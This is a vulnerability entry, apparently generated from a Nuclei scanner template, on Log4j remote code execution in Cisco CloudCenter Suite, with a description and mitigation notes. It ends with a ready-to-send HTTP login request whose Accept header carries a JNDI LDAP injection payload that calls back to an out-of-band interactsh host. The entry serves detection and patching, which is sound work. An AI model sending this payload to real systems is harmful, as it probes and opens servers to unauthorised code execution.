# Vulnerability: Cisco CloudCenter Suite (Log4j) - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`cisco-cloudcenter-suite-log4j-rce.yaml`)

## Description
Cisco CloudCenter Suite is susceptible to remote code execution via the Apache Log4j library. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

## Secure Mitigation
From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 10s
POST /suite-auth/login HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.accept.{{interactsh-url}}}
Content-Type: application/json

{"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}
```

